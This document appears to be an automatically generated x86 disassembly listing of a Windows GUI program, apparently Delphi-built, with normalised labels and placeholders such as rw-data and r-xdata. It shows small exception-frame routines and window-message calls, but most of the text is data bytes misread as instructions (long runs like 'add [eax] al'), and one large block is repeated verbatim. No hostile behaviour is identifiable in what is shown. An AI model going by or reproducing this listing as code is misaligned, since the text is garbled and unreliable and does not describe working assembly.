xor eax eax
push ebp
push sub_42d575
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d57c
retn
sub_42d588
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d5ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d5b4
retn
sub_42d5c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d5e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d5ec
retn
sub_42d5f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d61d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d624
retn
sub_42d662
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0x89
salc
inc edx
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d690
retn
sub_42d69c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d6c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d6c8
retn
sub_42d6d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d6f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d700
retn
sub_42d8c0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
call sub_422ba4
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42d8f4
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_46ea0c
mov cl 0x1
sub_42d91c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403554
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42d954
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d97e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d9ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_4653e8
mov [ ebp - 0x14 ] eax
call sub_465304
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42daaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46e2fc
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42da81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42da88
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46e358
retn
sub_42da88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dab6
mov eax [ ebp - 0x14 ]
call sub_46549c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_46530c
retn
sub_42db8c
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_409200
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42dc27
add [ edi ] cl
add [ eax ] al
add [ eax + 0x48 ] cl
dec ecx
add al dh
pop ebx
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x49 ] al
add [ edi + ebx * 2 + 0x49 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x48 ] al
dec ecx
add [ ebx + ebx * 2 + 0x49 ] ch
add [ eax ] al
cmp al 0x48
dec ecx
add al ch
pushad
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] bh
dec eax
dec ecx
add [ eax + 0x495f ] al
add [ eax ] al
add [ eax + ecx * 2 ] dh
dec ecx
add al ch
pop esi
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] dh
dec eax
dec ecx
add [ eax + 0x49 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 ] ch
dec ecx
add al dh
pop ebp
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] ch
dec eax
dec ecx
add [ eax ] dl
pop edi
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 ] ah
dec ecx
add [ eax ] ah
pop esi
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] ah
dec eax
dec ecx
add [ eax + 0x4961 ] ch
add [ eax ] al
add ah ch
inc edi
dec ecx
add [ eax + 0x5c ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add al ch
inc edi
dec ecx
add ah al
pushad
dec ecx
add [ eax ] al
add [ eax ] al
add ah ah
inc edi
dec ecx
add [ eax ] ah
popad
dec ecx
add [ eax ] al
add [ eax ] al
add al ah
inc edi
dec ecx
add [ eax + 0x495e ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42dd32
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd39
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404bb4
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42dd3c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403e68
call sub_42db8c
mov eax [ r-xdata ]
call sub_41832c
mov eax [ r-xdata ]
call sub_4183cc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
sub_42dd7c
enter 0x42dd 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x42de
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x22 ] bl
inc edx
add [ eax + 0x1 ] dh
add [ eax ] al
nop
lodsb [ esi ]
inc esp
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add al ah
cld
inc esp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + 0x63 ] bl
inc ebp
add al al
or [ ebp ] eax
mov eax 0xf40044fd
xchg edx eax
inc ecx
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x10 ]
fadd [ eax + eax - 0x64 ]
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edi + esi * 8 ] bl
inc edx
add [ eax - 0x8 ] dl
inc esp
add [ eax + edi * 8 + 0x44 ] cl
add [ ecx + edi * 8 ] bl
inc esp
add al bh
fild [ eax + eax + 0x3c ]
jecxz r-xdata
add ah bl
in eax dx
inc esp
add [ edi + esi * 8 + 0x42 ] bh
add [ eax - 0x37ffbb1e ] ah
jmp r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add [ ecx ] cl
push esp
push eax
popad
imul ebp [ esi + 0x74 ] 0x8b786f42
shr [ eax - 0x22 ] 0x42
add [ edi ] al
or [ eax + edx * 2 + 0x61 ] edx
imul ebp [ esi + 0x74 ] 0xc8786f42
fld [ edx ]
test [ ebp + 0x270044 ] ch
or [ ebp + 0x78 ] al
je r-xdata
fwait
shl [ eax ] 0x42
add [ eax ] dh
add bh bh
push esp
0xea700044 0x44
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ebx ] cl
inc ebx
outsd
outsb
jae r-xdata
insb
jae r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
inc ecx
insb
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
dec [ eax ]
fadd [ eax + eax - 0x5c ]
fadd [ eax + eax ]
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
add [ eax + 0x5b004491 ] ch
add [ eax ] al
dec eax
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
call 0x61432345
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x44919073
add [ edx ] bh
add bh bh
jpe r-xdata
push eax
popad
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
adc al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
pushad
xor eax 0x680042
inc ebx
jne r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001b ] al
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
pop edx
add [ eax ] al
[ eax - 0x47ffbb17 ]
jae r-xdata
add [ eax ] al
js r-xdata
add [ eax ] eax
jmp [ eax ]
outsb
jne r-xdata
add [ eax ] eax
outsb
je r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
jmp eax
add bh bh
test al 0xe9
inc esp
add [ eax + 0x44e9 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040013 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0b0021 ] al
dec edi
jbe r-xdata
loopne r-xdata
push eax
outsd
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ edx + ebp * 8 ]
inc esp
add ah cl
jmp r-xdata
add [ eax ] al
sbb [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe8656c62
pop ebp
inc ecx
add [ eax ] ah
add [ eax ] al
call esp
out 0x44 eax
add [ eax + 0x9 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push 0x6948776f
outsb
je r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cwde
inc esp
add [ ebx - 0x64010000 ] bl
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0025 ] al
outsb
inc esp
outsd
ja r-xdata
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001c ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941e112
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001d ] al
outsb
inc esp
jb r-xdata
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001f ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x20 ] bp
pushfd
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001a ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
fiadd [ ebp ]
jl r-xdata
inc eax
add [ eax + 0x1b ] al
jb r-xdata
les ebx [ edx + 0xd80044 ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f0a001e ] al
outsb
inc esp
jb r-xdata
add bh bh
[ eax ] al
pushfd
add [ eax ] 0x0
add [ eax + 0x4f090020 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
dec ebp
outsd
jne r-xdata
dec esp
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
push cs
dec edi
pop ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add bh bh
insb
call sub_43e082
add [ eax ] al
dec ecx
outsb
je r-xdata
add [ eax - 0x8 ] al
inc esp
outsd
arpl [ ebx - 0x68 ] bp
pushfd
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0026 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
0xd00044 0xff00
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
or ecx [ edi + 0x6e ]
jo r-xdata
add al cl
loop r-xdata
push ebp
jo r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
insd
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
in al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2bffbd1c ] ch
in al 0x42
add [ edx + eax ] ah
add [ eax ] al
mov al 0xad
inc esp
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
insb
jae r-xdata
int3
jb r-xdata
popad
dec esp
0xe00044 0xff00
loopne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
fwait
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc edx
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
xor al [ eax ]
inc eax
clc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
add [ eax + 0x4f090023 ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebx
je r-xdata
pop ebp
inc ecx
add [ eax + 0x1 ] ch
add bh bh
push 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
inc ebp
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x58 ]
adc [ ebp ] al
pushfd
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add ah al
stc
inc edx
add al ah
push esi
inc ebp
add [ eax ] bl
add [ ebx ] al
dec eax
pop ebx
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
popad
insb
call 0x384324d0
add [ eax ] al
[ eax + 0x10042f9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42e3dc72
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add al dh
test [ edx ] 0xffef0001
mov al 0xf9
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xe30c9072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42e2c872
add [ eax + 0x74 ] ch
inc ecx
add [ 0x78450800 ] al
je r-xdata
inc esp
jb r-xdata
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] ecx
push ds
add [ eax ] al
jecxz r-xdata
add [ eax ] al
add bh bh
js r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
inc edx
add ah dl
sbb eax 0x1edc0042
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
loop r-xdata
lea eax [ bx + si ]
enter 0x42e2 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xe3
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + eax ] al
add [ ebx + esi * 2 + 0x41 ] ch
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
dec [ eax + 0x10042f9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
sub_42de3c
dec esp
sti
inc esp
add [ eax ] cl
or al 0x45
add [ eax - 0x3ffbb13 ] cl
in eax dx
inc esp
add [ eax - 0x22 ] dh
inc esp
add ah bl
in eax dx
inc esp
add [ edi + esi * 8 + 0x42 ] bh
add [ ecx ] cl
push esp
push eax
popad
imul ebp [ esi + 0x74 ] 0x8b786f42
shr [ eax - 0x22 ] 0x42
add [ edi ] al
or [ eax + edx * 2 + 0x61 ] edx
imul ebp [ esi + 0x74 ] 0xc8786f42
fld [ edx ]
test [ ebp + 0x270044 ] ch
or [ ebp + 0x78 ] al
je r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
fwait
shl [ eax ] 0x42
add [ eax ] dh
add bh bh
push esp
0xea700044 0x44
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ebx ] cl
inc ebx
outsd
outsb
jae r-xdata
insb
jae r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
inc ecx
insb
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
dec [ eax ]
fadd [ eax + eax - 0x5c ]
fadd [ eax + eax ]
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
add [ eax + 0x5b004491 ] ch
add [ eax ] al
dec eax
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
call 0x61432345
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x44919073
add [ edx ] bh
add bh bh
jpe r-xdata
push eax
popad
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
adc al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
pushad
xor eax 0x680042
inc ebx
jne r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001b ] al
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
pop edx
add [ eax ] al
[ eax - 0x47ffbb17 ]
jae r-xdata
add [ eax ] al
js r-xdata
add [ eax ] eax
jmp [ eax ]
outsb
jne r-xdata
add [ eax ] eax
outsb
je r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
jmp eax
add bh bh
test al 0xe9
inc esp
add [ eax + 0x44e9 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040013 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0b0021 ] al
dec edi
jbe r-xdata
loopne r-xdata
push eax
outsd
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ edx + ebp * 8 ]
inc esp
add ah cl
jmp r-xdata
add [ eax ] al
sbb [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe8656c62
pop ebp
inc ecx
add [ eax ] ah
add [ eax ] al
call esp
out 0x44 eax
add [ eax + 0x9 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push 0x6948776f
outsb
je r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cwde
inc esp
add [ ebx - 0x64010000 ] bl
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0025 ] al
outsb
inc esp
outsd
ja r-xdata
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001c ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941e112
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001d ] al
outsb
inc esp
jb r-xdata
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001f ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x20 ] bp
pushfd
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001a ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
fiadd [ ebp ]
jl r-xdata
inc eax
add [ eax + 0x1b ] al
jb r-xdata
les ebx [ edx + 0xd80044 ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f0a001e ] al
outsb
inc esp
jb r-xdata
add bh bh
[ eax ] al
pushfd
add [ eax ] 0x0
add [ eax + 0x4f090020 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
dec ebp
outsd
jne r-xdata
dec esp
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
push cs
dec edi
pop ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add bh bh
insb
call sub_43e082
add [ eax ] al
dec ecx
outsb
je r-xdata
add [ eax - 0x8 ] al
inc esp
outsd
arpl [ ebx - 0x68 ] bp
pushfd
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0026 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
0xd00044 0xff00
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
or ecx [ edi + 0x6e ]
jo r-xdata
add al cl
loop r-xdata
push ebp
jo r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
insd
inc ebp
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
in al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2bffbd1c ] ch
in al 0x42
add [ edx + eax ] ah
add [ eax ] al
mov al 0xad
inc esp
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
insb
jae r-xdata
int3
jb r-xdata
popad
dec esp
0xe00044 0xff00
loopne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
fwait
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc edx
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
xor al [ eax ]
inc eax
clc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
add [ eax + 0x4f090023 ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebx
je r-xdata
pop ebp
inc ecx
add [ eax + 0x1 ] ch
add bh bh
push 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
